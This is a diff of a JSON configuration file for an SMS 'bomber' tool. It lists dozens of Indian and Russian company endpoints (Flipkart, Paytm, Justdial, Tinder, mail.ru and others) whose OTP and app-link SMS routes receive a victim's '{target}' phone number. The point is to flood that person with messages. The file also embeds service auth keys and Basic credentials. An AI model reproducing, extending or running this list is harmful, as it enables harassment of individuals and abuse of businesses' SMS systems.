@@ -1,88 +1,28 @@
 {
-    "version":"1.1",
-    "created_by":"https://github.com/skp121/",
+    "version":"2.0",
+    "created_by":"iMro0t, AvinashReddy3108",
     "providers":{
         "91":[
             {
                 "name":"confirmtkt",
                 "method":"GET",
-                "url":"https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber=",
+                "url":"https://securedapi.confirmtkt.com/api/platform/register",
+                "params": {"newOtp": "true", "mobile_number": "{target}"},
                 "identifier":"false"
-            },
-            {
-                "name":"ninzatech",
-                "method":"GET",
-                "url":"https://scripts.ktmtech.in/SmS/?code=4246a980cfa62228885eb3748c69560d&phn=",
-                "identifier":"Page generated"
-            },
-            {
-                "name":"shahxhtml",
-                "method":"GET",
-                "url":"http://shahxhtml.somee.com/bomber/pokkt.php?l=1&no=",
-                "identifier":"Bombed."
             },
             {
                 "name":"justdial",
                 "method":"GET",
-                "url":"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile=",
+                "url":"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
+                "params": {"mobile": "{target}"},
                 "identifier":"sent"
-            },
-            {
-                "name":"wynkmusic",
-                "method":"POST",
-                "url":"https://sapi.wynk.in/music/v2/account/otp",
-                "target_param":"msisdn",
-                "data_type":"json",
-                "headers":{
-                    "Referer":"https://wynk.in/music",
-                    "origin":"https://wynk.in"
-                },
-                "data":{
-                    "msisdn":""
-                },
-                "identifier":"msisdn"
-            },
-            {
-                "name":"snapdeal",
-                "method":"POST",
-                "url":"https://www.snapdeal.com/sendOTP",
-                "target_param":"mobileNumber",
-                "headers":{
-                    "referer":"https://www.snapdeal.com/iframeLogin",
-                    "x-requested-with":"XMLHttpREquest"
-                },
-                "data":{
-                    "emailId":"",
-                    "mobileNumber":"",
-                    "purpose":"LOGIN_WITH_MOBILE_OTP"
-                },
-                "identifier":"success"
-            },
-            {
-                "name":"oyorooms",
-                "method":"GET",
-                "url":"https://www.oyorooms.com/api/pwa/generateotp?country_code=91&nod=4&phone=",
-                "identifier":"correct"
-            },
-            {
-                "name":"oyorooms2",
-                "method":"GET",
-                "url":"https://api.oyorooms.com/api/v2/users/initiate_login?nod=4&intent=login&sms_auto_retrieval=true&android_version=22&country_code=+91&phone_number=",
-                "headers":{
-                    "access_token":"QmpDZlRxZWo2UkZ5M3pSeHZ5NW46bi13NHN0ZTV5V1I1aGpCUVVHOUM=",
-                    "SEGMENT_CONFIG":"default",
-                    "Authorization":"Basic QmpDZlRxZWo2UkZ5M3pSeHZ5NW46bi13NHN0ZTV5V1I1aGpCUVVHOUM=",
-                    "User-Agent":"Dalvik/2.1.0 (Linux; U; Android 5.1.1; G011A Build/LMY48Z)"
-                },
-                "identifier":"correct"
             },
             {
                 "name":"frotels",
                 "method":"POST",
                 "url":"https://www.frotels.com/appsendsms.php",
-                "target_param":"mobno",
                 "data":{
-                    "mobno":""
+                    "mobno":"{target}"
                 },
                 "identifier":"sent"
             },
@@ -90,9 +30,8 @@
                 "name":"gapoon",
                 "method":"POST",
                 "url":"https://www.gapoon.com/userSignup",
-                "target_param":"mobile",
                 "data":{
-                    "mobile":"",
+                    "mobile":"{target}",
                     "email":"a@a.com",
                     "name":"a"
                 },
@@ -102,10 +41,9 @@
                 "name":"housing",
                 "method":"POST",
                 "url":"https://login.housing.com/api/v2/send-otp",
-                "target_param":"phone",
                 "data_type":"json",
                 "data":{
-                    "phone":""
+                    "phone":"{target}"
                 },
                 "identifier":"Sent"
             },
@@ -113,9 +51,8 @@
                 "name":"porter",
                 "method":"POST",
                 "url":"https://porter.in/restservice/send_app_link_sms",
-                "target_param":"phone",
                 "data":{
-                    "phone":"",
+                    "phone":"{target}",
                     "referrer_string":"",
                     "brand":"porter"
                 },
@@ -125,59 +62,30 @@
                 "name":"cityflo",
                 "method":"POST",
                 "url":"https://cityflo.com/website-app-download-link-sms/",
-                "target_param":"mobile_number",
                 "data":{
-                    "mobile_number":""
+                    "mobile_number":"{target}"
                 },
                 "identifier":"sent"
-            },
-            {
-                "name":"grabon",
-                "method":"POST",
-                "url":"https://www.grabon.in/giftcards/verify/",
-                "target_param":"phonenumber",
-                "data":{
-                    "phonenumber":""
-                },
-                "identifier":"npub"
             },
             {
                 "name":"nnnow",
                 "method":"POST",
                 "url":"https://api.nnnow.com/d/api/appDownloadLink",
-                "target_param":"mobileNumber",
                 "data":{
-                    "mobileNumber":""
+                    "mobileNumber":"{target}"
                 },
                 "identifier":"true"
             },
             {
-                "name":"frapp",
-                "method":"POST",
-                "url":"https://vortex.frapp.in/mobileotp",
-                "target_param":"mobile",
-                "data_type":"json",
-                "headers":{
-                    "platform":"android",
-                    "version":"519",
-                    "User-Agent":"okhttp/3.11.0"
-                },
-                "data":{
-                    "mobile":""
-                },
-                "identifier":"mobile"
-            },
-            {
                 "name":"ajio",
                 "method":"POST",
-                "url":"https://www.ajio.com/api/auth/signupSendOTP",
-                "target_param":"mobileNumber",
+                "url":"https://login.web.ajio.com/api/auth/signupSendOTP",
                 "data":{
-                    "firstName":"a",
-                    "login":"iodry65i@wdafw.com",
-                    "password":"awf324",
+                    "firstName":"xxps",
+                    "login":"wiqpdl223@wqew.com",
+                    "password":"QASpw@1s",
                     "genderType":"Male",
-                    "mobileNumber":"",
+                    "mobileNumber":"{target}",
                     "requestType":"SENDOTP"
                 },
                 "identifier":"1"
@@ -185,40 +93,26 @@
             {
                 "name":"happyeasygo",
                 "method":"GET",
-                "url":"https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20",
+                "url":"https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do",
+                "params": {"phone": "91%20{target}"},
                 "identifier":"true"
             },
             {
                 "name":"unacademy",
                 "method":"POST",
                 "url":"https://unacademy.com/api/v1/user/get_app_link/",
-                "target_param":"phone",
-                "data":{
-                    "phone":""
-                },
-                "identifier":"sent"
-            },
-            {
-                "name":"unacademy2",
-                "method":"POST",
-                "url":"https://unacademy.com/api/v2/user/user_check/",
-                "target_param":"phone",
                 "data_type":"json",
                 "data":{
-                    "phone":"",
-                    "country_code":"in",
-                    "otp_type":1,
-                    "email":"memebot@gmail.com"
+                    "phone":"{target}"
                 },
-                "identifier":"has_name"
+                "identifier":"sent"
             },
             {
                 "name":"treebo",
                 "method":"POST",
                 "url":"https://www.treebo.com/api/v2/auth/login/otp/",
-                "target_param":"phone_number",
                 "data":{
-                    "phone_number":""
+                    "phone_number":"{target}"
                 },
                 "identifier":"sent"
             },
@@ -226,10 +120,9 @@
                 "name":"mobikwik",
                 "method":"POST",
                 "url":"https://webapi.mobikwik.com/p/account/otp/cell/v2",
-                "target_param":"cell",
                 "data_type":"json",
                 "data":{
-                    "cell":""
+                    "cell":"{target}"
                 },
                 "headers":{
                     "X-MClient":"0"
@@ -239,17 +132,17 @@
             {
                 "name":"airtel",
                 "method":"GET",
-                "url":"https://www.airtel.in/referral-api/core/notify?messageId=map&rtn=",
+                "url":"https://www.airtel.in/referral-api/core/notify",
+                "params": {"messageId": "map", "rtn": "{target}"},
                 "identifier":"Success"
             },
             {
                 "name":"pharmeasy",
                 "method":"POST",
                 "url":"https://pharmeasy.in/api/auth/requestOTP",
-                "target_param":"contactNumber",
                 "data_type":"json",
                 "data":{
-                    "contactNumber":""
+                    "contactNumber":"{target}"
                 },
                 "identifier":"resendSmsCounter"
             },
@@ -257,33 +150,30 @@
                 "name":"mylescars",
                 "method":"POST",
                 "url":"https://www.mylescars.com/usermanagements/chkContact",
-                "target_param":"contactNo",
                 "data":{
-                    "contactNo":""
+                    "contactNo":"{target}"
                 },
-                "identifier":"success@1"
+                "identifier":"success@::::"
             },
             {
                 "name":"grofers",
                 "method":"POST",
                 "url":"https://grofers.com/v2/accounts/",
-                "target_param":"user_phone",
                 "data":{
-                    "user_phone":""
+                    "user_phone":"{target}"
                 },
                 "headers":{
-                    "auth_key":"f0ff43cbba473a0ddc03e2a6c0f79fc65779edc83aaad18caa2a4f4ddaac09fc"
+                    "auth_key":"3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"
                 },
-                "identifier":"sent"
+                "identifier":"We have sent"
             },
             {
                 "name":"dream11",
                 "method":"POST",
                 "url":"https://api.dream11.com/sendsmslink",
-                "target_param":"mobileNum",
                 "data":{
                     "siteId":"1",
-                    "mobileNum":"",
+                    "mobileNum":"{target}",
                     "appType":"androidfull"
                 },
                 "identifier":"true"
@@ -291,59 +181,30 @@
             {
                 "name":"cashify",
                 "method":"GET",
-                "url":"https://www.cashify.in/api/cu01/v1/app-link?mn=",
+                "url":"https://www.cashify.in/api/cu01/v1/app-link",
+                "params": {"mn": "{target}"},
                 "identifier":"Successfully"
-            },
-            {
-                "name":"olx",
-                "method":"POST",
-                "cc_target":"descriptor",
-                "url":"https://www.olx.in/api/challenges",
-                "target_param":"descriptor",
-                "data_type":"json",
-                "data":{
-                    "type":"phone",
-                    "descriptor":"+"
-                },
-                "identifier":"number"
             },
             {
                 "name":"paytm",
                 "method":"POST",
                 "url":"https://commonfront.paytm.com/v4/api/sendsms",
-                "target_param":"phone",
                 "data_type":"json",
                 "data":{
-                    "phone":""
+                    "phone":"{target}",
+                    "guid":"2952fa812660c58dc160ca6c9894221d"
                 },
-                "identifier":"403"
+                "identifier":"202"
             }
         ],
         "multi":[
-            {
-                "name":"redbus",
-                "method":"POST",
-                "cc_target":"SMSMessage[phoneCode]",
-                "url":"https://www.redbus.in/Info/SendMobileSMS/",
-                "target_param":"SMSMessage[mobileNo]",
-                "data":{
-                    "IsTemplateUsedForMessage":"true",
-                    "NotificationType":"SMS",
-                    "SMSMessage[mobileNo]":"",
-                    "SMSMessage[phoneCode]":"",
-                    "CustomMessageDetails[DataComplexity]":"KVP",
-                    "CustomMessageDetails[TemplateName]":"DownloadAppLink"
-                },
-                "identifier":"sent"
-            },
             {
                 "name":"flipkart",
                 "method":"POST",
                 "cc_target":"loginId",
                 "url":"https://www.flipkart.com/api/5/user/otp/generate",
-                "target_param":"loginId",
                 "data":{
-                    "loginId":"+"
+                    "loginId":"+{target}"
                 },
                 "headers":{
                     "X-user-agent":"Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
@@ -353,28 +214,76 @@
                 "identifier":"emailMask"
             },
             {
-                "name":"flipkart2",
+                "name":"qlean",
                 "method":"POST",
-                "cc_target":"loginId",
-                "url":"https://www.flipkart.com/api/6/user/signup/status",
-                "target_param":"loginId",
-                "data_type":"json",
+                "url":"https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                 "data":{
-                    "loginId":"+",
-                    "supportAllStates":true
+                    "phone":"{cc}{target}"
                 },
-                "headers":{
-                    "X-user-agent":"Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
-                    "Origin":"https://www.flipkart.com"
-                },
-                "identifier":"email"
+                "identifier":"request_id"
             },
             {
-                "name":"redbus2",
-                "method":"GET",
-                "cc_target":"phoneCode",
-                "url":"https://www.redbus.in/Personalization/SendOTP?OTPSource=SIGNIN&mobile=",
+                "name":"mail.ru",
+                "method":"POST",
+                "url":"https://cloud.mail.ru//api/v2/notify/applink",
+                "data_type":"json",
+                "data":{
+                    "phone":"+{cc}{target}",
+                    "api":"2",
+                    "email":"email",
+                    "x-email":"x-email"
+                },
+                "identifier":"200"
+            },
+            {
+                "name":"gotinder",
+                "method":"POST",
+                "url":"https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
+                "data":{
+                    "phone_number":"{cc}{target}"
+                },
+                "identifier":"200"
+            },
+            {
+                "name":"youla.ru",
+                "method":"POST",
+                "url":"https://youla.ru/web-api/auth/request_code",
+                "data_type":"json",
+                "data":{
+                    "phone":"+{cc}{target}"
+                },
+                "identifier":"code_length"
+            },
+            {
+                "name":"ivi.ru",
+                "method":"POST",
+                "url":"https://api.ivi.ru/mobileapi/user/register/phone/v6",
+                "data":{
+                    "phone":"{cc}{target}"
+                },
                 "identifier":"true"
+            },
+            {
+                "name":"delitime.ru",
+                "method":"POST",
+                "url":"https://api.delitime.ru/api/v2/signup",
+                "data":{
+                    "SignupForm[username]":"{cc}{target}",
+                    "SignupForm[device_type]":"3"
+                },
+                "identifier":"true"
+            },
+            {
+                "name":"icq.com",
+                "method":"POST",
+                "url":"https://www.icq.com/smsreg/requestPhoneValidation.php",
+                "data":{
+                    "msisdn":"{cc}{target}",
+                    "locale":"en",
+                    "k":"ic1rtwz1s1Hj1O0r",
+                    "r":"45559"
+                },
+                "identifier":"200"
             }
         ]
     }
